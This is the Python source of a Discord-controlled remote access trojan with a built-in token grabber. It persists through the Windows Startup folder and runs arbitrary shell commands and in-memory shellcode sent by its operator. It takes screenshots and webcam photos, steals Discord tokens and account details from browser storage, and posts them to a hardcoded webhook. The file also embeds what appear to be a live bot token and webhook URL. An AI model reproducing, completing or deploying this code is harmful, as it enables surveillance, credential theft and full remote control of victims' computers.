import pprint
from json import loads, dumps
import time
from Shell_Engine import *
import base64
import ctypes
import getpass
import re
import subprocess
import urllib.request
import sys
import string
import random
from discord import message
import logging
from re import findall
import GPUtil
from tabulate import tabulate
import cv2
import discord
from discord.ext import commands
from discord import client
import os
import socket
import platform
import shutil
import pyautogui
import win32gui
import json
import base64
import sqlite3
import win32crypt
from datetime import timezone, datetime, timedelta
import psutil
from subprocess import Popen, PIPE
from datetime import datetime
from threading import Thread
import time
from sys import argv
import win32process
from base64 import b64decode
from urllib.request import Request, urlopen
bot = discord.Client()

token = 'OTM4OTY1NTg3MTEwMDE0OTk2.Yfx92Q.XBs1FhYUf-HASu7qDGFrTAzUfAc'
WEBHOOK = 'https://discord.com/api/webhooks/940641675758424124/Jyt3kY-HPFa3IoqZDCUd7CVaRJbY2R_xxp_TdM4OuXlPgf0UFZ3XI7ebi1Ks00_RPp7a'


def webhook_info(content, username="Trojan"):
    webhook = {
        "content": content,
        "embeds": "",
        "username": "Trojan",
        "avatar_url": "https://immagini.tpadev.repl.co/trojan.png" 
    }
    return webhook

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

logger = logging.getLogger('discord')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)



description = '''yes'''

intents = discord.Intents.default()
intents.members = True

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

bot = commands.Bot(command_prefix='!', description=description, intents=intents)

try:
    shutil.move(argv[0], f'C:\\Users\\{os.getenv("UserName")}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
except Exception as e:
    pass

@bot.event
async def on_ready():
    print("-----------------------------------------------")
    print("[!] Iniciando seccion como: ", bot.user.name)
    print("[!] ID: ", bot.user.id)
    print("-----------------------------------------------")


@bot.command()
async def cmd(ctx, input: str):
    """executes commands on the pc"""
    comando = input
    b = subprocess.check_output(comando, shell=True)
    output = b.decode('cp1252')
    #if comando == "nslookup myip.opendns.com. resolver1.opendns.com":
        #await ctx.send("no")
    #await ctx.send(output)
    embed = discord.Embed(title='Console', description = '[!]: '+output, color = 0x680a0a)
    embed.set_author(name='Skultz Shell', icon_url='https://cdn.discordapp.com/avatars/938965587110014996/e54cc8194cd33f576549fd75923fc642.png?size=1024')
    embed.set_footer(text="Command executed by: {}".format(ctx.author.display_name))
    await ctx.send(embed=embed)

@bot.command()
async def c(ctx):
    """custom help message"""
    await ctx.send(help_message)


@bot.command()
async def sysm(ctx):
    """returns system information"""
    sysinfo = get_system_info()
    #await ctx.send(sysinfo)
    embed = discord.Embed(title='System information', description = '[!]: '+sysinfo, color = 0x680a0a)
    embed.set_author(name='Skultz Shell', icon_url='https://cdn.discordapp.com/avatars/938965587110014996/e54cc8194cd33f576549fd75923fc642.png?size=1024')
    embed.set_footer(text="Command executed by: {}".format(ctx.author.display_name))
    await ctx.send(embed=embed)

@bot.command()
async def shell(ctx, msg: str):
    """executes shellcode on base64"""
    if "Windows" not in platform.system():
        return "[!] Currently this functionality is only available for Windows platforms."
    else:
        # based on Debasish Mandal's "Execute ShellCode Using Python"
        # http://www.debasish.in/2012/04/execute-shellcode-using-python.html
        shellcode = bytearray(base64.b64decode(msg))

        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                  ctypes.c_int(len(shellcode)),
                                                  ctypes.c_int(0x3000),
                                                  ctypes.c_int(0x40))

        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))

        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))

        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
                                                   ctypes.c_int(-1))

        return "[*] Shellcode (%d bytes) executed in memory." % len(shellcode)

pc_name = os.getenv("UserName")
system = platform.system()
@bot.command()
async def screenshot(ctx, pc=pc_name):
    """takes a screenshot in real time of the pc"""
    if pc == os.getenv("UserName"):
        pyautogui.screenshot(f'C:\\Users\\{os.getenv("username")}\\s.png')
        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("username")}\\s.png'))
        os.remove(f'C:\\Users\\{os.getenv("username")}\\s.png')

@bot.command()
async def battery(ctx, pc=pc_name):
    """send the pc battery status"""
    if pc == os.getenv("UserName"):
        battery = psutil.sensors_battery()
        await ctx.send(f"Battery percentage : {battery.percent}\nPower plugged in : {battery.power_plugged}")

def advence_info(path):
    with open(path, "w") as write:
        write.write( "=" * 40 + "System Information" +  "=" * 40 + "\n")
        uname = platform.uname()
        write.write(f"System: {uname.system}\n")
        write.write(f"Node Name: {uname.node}\n")
        write.write(f"Release: {uname.release}\n")
        write.write(f"Version: {uname.version}\n")
        write.write(f"Machine: {uname.machine}\n")
        write.write(f"Processor: {uname.processor}\n")

        write.write( "=" * 40 + "Boot Time" +  "=" * 40 + "\n")
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        write.write(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n")

        write.write( "=" * 40 + "CPU Info" +  "=" * 40 + "\n")
        write.write("Physical cores:" + str(psutil.cpu_count(logical=False)) + "\n")
        write.write("Total cores:" + str(psutil.cpu_count(logical=True)) + "\n")
        cpufreq = psutil.cpu_freq()
        write.write(f"Max Frequency: {cpufreq.max:.2f}Mhz\n")
        write.write(f"Min Frequency: {cpufreq.min:.2f}Mhz\n")
        write.write(f"Current Frequency: {cpufreq.current:.2f}Mhz\n")

        write.write( "=" * 40 + "Memory Information" +  "=" * 40 + "\n")
        svmem = psutil.virtual_memory()
        write.write(f"Total: {get_size(svmem.total)}\n")
        write.write(f"Available: {get_size(svmem.available)}\n")
        write.write(f"Used: {get_size(svmem.used)}\n")
        write.write(f"Percentage: {svmem.percent}%\n")
        write.write("="*20 + "SWAP" + "="*20)
        swap = psutil.swap_memory()
        write.write(f"Total: {get_size(swap.total)}\n")
        write.write(f"Free: {get_size(swap.free)}\n")
        write.write(f"Used: {get_size(swap.used)}\n")
        write.write(f"Percentage: {swap.percent}%\n")

        write.write( "=" * 40 + "Disk Information" +  "=" * 40 + "\n")
        write.write("Partitions and Usage:")
        partitions = psutil.disk_partitions()
        for partition in partitions:
            write.write(f"=== Device: {partition.device} ===\n")
            write.write(f"  Mountpoint: {partition.mountpoint}\n")
            write.write(f"  File system type: {partition.fstype}\n")
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            write.write(f"  Total Size: {get_size(partition_usage.total)}")
            write.write(f"  Used: {get_size(partition_usage.used)}\n")
            write.write(f"  Free: {get_size(partition_usage.free)}\n")
            write.write(f"  Percentage: {partition_usage.percent}%\n")
        disk_io = psutil.disk_io_counters()
        write.write(f"Total read: {get_size(disk_io.read_bytes)}\n")
        write.write(f"Total write: {get_size(disk_io.write_bytes)}\n")

        write.write( "=" * 40 + "Network Information" + "=" * 40 + "\n")
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                write.write(f"=== Interface: {interface_name} ===\n")
                if str(address.family) == 'AddressFamily.AF_INET':
                    write.write(f"  IP Address: {address.address}\n")
                    write.write(f"  Netmask: {address.netmask}\n")
                    write.write(f"  Broadcast IP: {address.broadcast}\n")
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    write.write(f"  MAC Address: {address.address}\n")
                    write.write(f"  Netmask: {address.netmask}\n")
                    write.write(f"  Broadcast MAC: {address.broadcast}\n")
        net_io = psutil.net_io_counters()
        write.write(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}\n")
        write.write(f"Total Bytes Received: {get_size(net_io.bytes_recv)}\n")

        write.write( "=" * 40 + "GPU Details" +  "=" * 40 + "\n")
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
            gpu_id = gpu.id
            gpu_name = gpu.name
            gpu_load = f"{gpu.load*100}%\n"
            gpu_free_memory = f"{gpu.memoryFree}MB\n"
            gpu_used_memory = f"{gpu.memoryUsed}MB\n"
            gpu_total_memory = f"{gpu.memoryTotal}MB\n"
            gpu_temperature = f"{gpu.temperature} °C\n"
            gpu_uuid = gpu.uuid
            list_gpus.append((
                gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                gpu_total_memory, gpu_temperature, gpu_uuid
            ))

        write.write(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                        "temperature", "uuid")))

WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/940641675758424124/Jyt3kY-HPFa3IoqZDCUd7CVaRJbY2R_xxp_TdM4OuXlPgf0UFZ3XI7ebi1Ks00_RPp7a'
@bot.event
async def on_ready():
    urlopen(Request(WEBHOOK_URL, data=dumps(webhook_info(f'> logged as **{os.getenv("UserName")}** | {str(socket.gethostname())} ({system})')).encode(), headers=getheaders()))



def normal_info():
    uname = platform.uname()
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    return f"""
Computer Name: {os.getenv('username')}
System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n"""

@bot.command()
async def info(ctx, pc=pc_name):
    """sends information about the pc"""
    await ctx.send(f"```yaml\n{normal_info()}\n```")

@bot.command()
async def textbox(ctx, pc=pc_name, *, args):
    """creates a textbox on the pc"""
    if pc == os.getenv("UserName"):
        cose = args.split(';')
        x = pyautogui.prompt(text=cose[1], title=cose[0] , default='')
        await ctx.send(f'response: `{x}`')

@bot.command()
async def cmd2(ctx, pc=pc_name, *, args):
    """executes commands on the powershell"""
    if pc == os.getenv("UserName"):
        os.system(f"powershell -c \"{args}\"")
        comando = args
        b  = subprocess.check_output(comando, shell=True)
        output = b.decode('cp1252')
        await ctx.send(output)

@bot.command()
async def photo(ctx, pc=pc_name):
    """takes pictures somehow"""
    if pc == os.getenv("UserName"):
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(f'C:\\Users\\{os.getenv("username")}\\f.png', image)
        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("username")}\\f.png'))
        os.remove(f'C:\\Users\\{os.getenv("username")}\\f.png')

@bot.command()
async def connections(ctx):
    """shows the current connection"""
    await ctx.send(f'> **{os.getenv("UserName")}** | {str(socket.gethostname())} ({system})')

@bot.command()
async def adv(ctx, pc=pc_name):
    advence_info(f'c:\\WINDOWS\\Temp\\i.txt')
    await ctx.send(file=discord.File(f'c:\\WINDOWS\\Temp\\i.txt'))
    os.remove(f'c:\\WINDOWS\\Temp\\i.txt')

def Auth(url):
    def dastela(url):
        WEBHOOK = url
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\discorddevelopment",
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"  : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
            
        }
        def getuserdata(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def getip():
            ip = "None"
            try:
                ip = urlopen(Request("https://api.ipify.org"))
            except:
                pass
            return ip
        def has_payment_methods(token):
            try:
                return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
            except:
                pass
        def send_message(token, chat_id, form_data):
            try:
                urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
            except:
                pass
        def main():
            cache_path = ROAMING + "\\.cache~$"
            prevent_spam = True
            embeds = []
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            ip = getip()
            pc_username = os.getenv("UserName")
            pc_name = os.getenv("COMPUTERNAME")
            user_path_name = os.getenv("userprofile").split("\\")[2]
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = getuserdata(token)
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(token)
                    username = user_data["username"] + "#" + str(user_data["discriminator"])
                    user_id = user_data["id"]
                    email = user_data.get("email")
                    phone = user_data.get("phone")
                    nitro = bool(user_data.get("premium_type"))
                    billing = bool(has_payment_methods(token))
                    embed = {
                        "color": 0x7289da,
                        "fields": [
                            {
                                "name": "**Account Info**",
                                "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                                "inline": True
                            },
                            {
                                "name": "**PC Info**",
                                "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                                "inline": True
                            },
                            {
                                "name": "**Token**",
                                "value": token,
                                "inline": False
                            }
                        ],
                        "author": {
                            "name": f"{username} ({user_id})",
                        },
                        "footer": {
                            "text": f"By TPA_profile.py"
                        }
                    }
                    embeds.append(embed)
            with open(cache_path, "a") as file:
                for token in checked:
                    if not token in already_cached_tokens:
                        file.write(token + "\n")
            if len(working) == 0:
                working.append('123')   
            webhook = {
                "content": "",
                "embeds": embeds,
                "username": "Token Grabber",
                "avatar_url": "https://immagini.tpadev.repl.co/trojan.png" 
            }
            try:
                urlopen(Request(WEBHOOK, data=dumps(webhook).encode(), headers=getheaders()))
            except:
                pass
        try:
            main()
        except Exception as e:
            print(e)
            pass
    try:
        dastela(url)
    except:
        pass
    os.system('cls')

@bot.command()
async def token(ctx, pc=pc_name, url=WEBHOOK_URL):
    if pc == os.getenv("UserName"):
        Auth(url)

bot.run(token)